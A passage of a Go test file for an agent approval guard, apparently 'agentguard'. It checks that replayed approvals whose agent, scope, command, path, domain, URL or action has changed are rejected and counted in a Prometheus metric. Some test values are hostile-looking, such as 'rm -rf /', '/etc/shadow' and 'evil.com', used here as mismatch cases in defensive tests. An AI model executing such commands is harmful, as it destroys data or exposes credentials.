		`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_a"}`)

	mismatchBefore := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal)

	// Three different mismatched replays — each must bump the counter.
	bodies := []string{
		fmt.Sprintf(`{"scope":"shell","command":"sudo apt install vim","agent_id":"agent_b","approval_id":%q}`, approvalID),
		fmt.Sprintf(`{"scope":"network","command":"sudo apt install vim","agent_id":"agent_a","approval_id":%q}`, approvalID),
		fmt.Sprintf(`{"scope":"shell","command":"rm -rf /","agent_id":"agent_a","approval_id":%q}`, approvalID),
	}
	for i, b := range bodies {
		_, _ = retryCheck(t, srv, b)
		want := mismatchBefore + uint64(i+1)
		if got := atomic.LoadUint64(&metrics.ApprovalReplayMismatchTotal); got != want {
			t.Errorf("after replay %d: ApprovalReplayMismatchTotal = %d; want %d", i+1, got, want)
		}
	}

	// Confirm the metric is also surfaced via the Prometheus exposition
	// (not just incremented in-memory) so operators can scrape it.
	var buf bytes.Buffer
	metrics.WritePrometheus(&buf)
	if !strings.Contains(buf.String(), "agentguard_approval_replay_mismatch_total") {
		t.Error("agentguard_approval_replay_mismatch_total not present in /metrics exposition")
	}
}

// TestMatchesOriginalRequest is a focused unit test of the helper's
// truth table. Keeps the field-comparison contract from drifting: if a
// future contributor adds a new ActionRequest field that should be
// authorising, this test should be extended in the same commit.
func TestMatchesOriginalRequest(t *testing.T) {
	base := policy.ActionRequest{
		AgentID: "agent_a",
		Scope:   "shell",
		Command: "sudo apt install vim",
		Path:    "/etc/hosts",
		Domain:  "api.example.com",
		URL:     "https://api.example.com/x",
		Action:  "write",
	}

	cases := []struct {
		name   string
		mutate func(r *policy.ActionRequest)
		want   bool
	}{
		{"identical", func(r *policy.ActionRequest) {}, true},
		{"different agent_id", func(r *policy.ActionRequest) { r.AgentID = "agent_b" }, false},
		{"different scope", func(r *policy.ActionRequest) { r.Scope = "filesystem" }, false},
		{"different command", func(r *policy.ActionRequest) { r.Command = "rm -rf /" }, false},
		{"different path", func(r *policy.ActionRequest) { r.Path = "/etc/shadow" }, false},
		{"different domain", func(r *policy.ActionRequest) { r.Domain = "evil.com" }, false},
		{"different url", func(r *policy.ActionRequest) { r.URL = "https://api.example.com/admin" }, false},
		{"different action", func(r *policy.ActionRequest) { r.Action = "read" }, false},

		// Non-authorising fields: drift is allowed.
		{"different session_id", func(r *policy.ActionRequest) {}, true}, // SessionID not in base; helper ignores it
		{"different est_cost", func(r *policy.ActionRequest) {}, true},
		{"different meta", func(r *policy.ActionRequest) {}, true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			retry := base
			tc.mutate(&retry)
			// Apply the drift-allowed mutations directly:
			switch tc.name {
			case "different session_id":
				retry.SessionID = "different"
			case "different est_cost":
				retry.EstCost = 99.99
			case "different meta":
				retry.Meta = map[string]string{"transport": "anything"}
			}
			if got := matchesOriginalRequest(retry, base); got != tc.want {
				t.Errorf("matchesOriginalRequest(%s) = %v; want %v", tc.name, got, tc.want)
			}
		})
	}
}
